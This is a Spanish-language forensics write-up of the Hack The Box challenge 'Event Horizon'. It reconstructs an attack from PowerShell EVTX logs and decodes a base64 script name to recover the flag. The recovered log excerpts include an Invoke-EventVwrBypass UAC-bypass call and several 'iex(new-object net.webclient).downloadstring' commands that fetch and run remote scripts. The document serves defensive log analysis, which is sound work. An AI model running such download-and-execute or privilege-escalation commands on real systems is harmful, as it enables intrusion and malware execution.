---
title: "Event Horizon"
description: "Writeup de Event Horizon - Hack The Box - Forensics 200pts. Logs EVTX de Windows PowerShell Operational; evtx_dump revela Invoke-EventVwrBypass con UAC bypass y comandos PowerShell IEX descargando scripts cuyo nombre en base64 es la flag."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - windows
  - evtx
  - powershell
  - evtx-dump
  - base64
  - uac-bypass
  - invoke-eventvwrbypass
---

# Event Horizon

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

Se entrega un ZIP con una colección de logs EVTX de Windows (cientos de archivos). Hay que analizar los logs de PowerShell para identificar el payload malicioso y recuperar la flag.

---

## Identificación del archivo relevante

```bash
ls -lahi Logs/ | grep -i power
```

```text
68 KB  Microsoft-Windows-PowerShell%4Admin.evtx
5.1 MB Microsoft-Windows-PowerShell%4Operational.evtx
68 KB  Microsoft-Windows-PowerShell-DesiredStateConfiguration...evtx
68 KB  Windows PowerShell.evtx
```

El fichero principal es `Microsoft-Windows-PowerShell%4Operational.evtx` (5.1 MB) — el log operacional de PowerShell registra todos los comandos ejecutados cuando está activado Script Block Logging o Module Logging.

---

## Parsing del log EVTX

```bash
evtx_dump "Logs/Microsoft-Windows-PowerShell%4Operational.evtx" | grep -i powershell
```

Fragmentos relevantes encontrados:

**1. UAC Bypass via EventViewer:**

```text
Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe \
  -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAo..."
```

El atacante usó `Invoke-EventVwrBypass` para elevar privilegios aprovechando el auto-elevación de `eventvwr.exe` en Windows.

**2. Descarga y ejecución de scripts maliciosos:**

```text
Host Application = powershell -ep bypass -c iex(new-object net.webclient).downloadstring(
  'https://gist.githubusercontent.com/hiddenblueteamer/.../SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg.ps1')

Host Application = powershell Iex(new-object net.webclient).downloadstring(
  'https://gist.githubusercontent.com/hiddenblueteamer/.../SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg.ps1')

Host Application = powershell -ep bypass -c iex(new-object net.webclient).downloadstring(
  'https://gist.githubusercontent.com/phwRi7EUp/.../SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg.ps1')
```

El nombre del script `.ps1` es idéntico en todas las URLs y parece codificado en base64: `SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg`.

---

## Decodificar el nombre del script

```bash
echo "SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg" | base64 -d
```

```text
HTB{FLAG}
```

El atacante nombró el script malicioso con la flag codificada en base64, probablemente como identificador único de la operación.

---

## Comando codificado del UAC bypass

El comando `-enc` también se puede decodificar para ver qué hace:

```bash
echo "IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAg..." | base64 -d | iconv -f UTF-16LE -t UTF-8
```

```text
"Is Elevated: $((([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) - $(Get-Date)" | Out-File C:\UACBypassTest.txt -Append
```

Es un test para verificar si el bypass de UAC fue exitoso (comprueba si el proceso corre como Administrador).

---

## Cadena de Ataque

```text
1. Logs EVTX → identificar Microsoft-Windows-PowerShell%4Operational.evtx
       ↓
2. evtx_dump → parsear eventos PowerShell
       ↓
3. Invoke-EventVwrBypass → UAC bypass para elevar a Admin
       ↓
4. powershell -ep bypass -c IEX → descarga y ejecuta scripts de Gist
       ↓
5. Nombre del script .ps1 = SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg (base64)
       ↓
6. base64 -d → flag
```

---

## Lecciones Aprendidas

- **PowerShell Script Block Logging**: activar el log operacional de PowerShell (Script Block Logging + Module Logging) es esencial para detectar ataques. Aquí permitió reconstruir toda la cadena del atacante.
- **IEX + DownloadString**: patrón clásico de "Living off the Land" — usa funcionalidades legítimas de .NET para descargar y ejecutar código sin escribir a disco. Monitorizarlo con AMSI y logging.
- **EventViewer UAC bypass**: técnica conocida (bypass de UAC via auto-elevación de `eventvwr.exe`) que funciona en Windows sin parchear las directivas de UAC. Solución: establecer UAC en nivel máximo o deshabilitar el auto-elevate de binarios específicos.

---

## Herramientas utilizadas

| Herramienta | Uso |
|-------------|-----|
| `evtx_dump` | Parsear archivos EVTX en texto legible |
| `grep` | Filtrar eventos de PowerShell |
| `base64` | Decodificar nombre del script y comandos `-enc` |

---

## Referencias

- [evtx_dump — GitHub](https://github.com/omerbenamram/evtx)
- [Invoke-EventVwrBypass — GitHub](https://github.com/enigma0x3/Invoke-EventVwrBypass)
- [MITRE ATT&CK — T1548.002 UAC Bypass via Event Viewer](https://attack.mitre.org/techniques/T1548/002/)
